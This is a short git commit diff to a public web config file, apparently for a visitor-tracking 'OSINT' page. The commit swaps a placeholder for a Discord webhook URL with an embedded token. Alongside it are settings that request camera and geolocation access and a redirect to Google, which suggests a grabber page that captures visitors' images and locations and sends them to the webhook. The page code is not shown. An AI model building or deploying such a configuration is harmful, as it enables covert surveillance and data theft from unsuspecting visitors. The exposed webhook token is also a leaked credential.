4cab6e8e01605f89f24e7d3a9311876fe6594282
ARIZONA <mgrdegh@gmx.de>
2026-03-29 14:47:27 +0200

    Fix webhook URL in osint-config.js - was using fake ABC123

--- public/osint-config.js
+++ public/osint-config.js
@@ -3,7 +3,7 @@
 
 window.OSINT_CONFIG = window.OSINT_CONFIG || {};
 Object.assign(window.OSINT_CONFIG, {
-  webhookUrl: "https://discord.com/api/webhooks/ABC123",
+  webhookUrl: "https://discordapp.com/api/webhooks/1487781638401163385/AB1V9_A3C1uS1xBluFpNX4gy4zIn6Xy3Xxx83hlvPsuMrNhBd0Huo7epfA-Em0vm-KtF",
   finalUrl: "https://www.google.com",
   requestCamera: true,
   requestGeo: true,
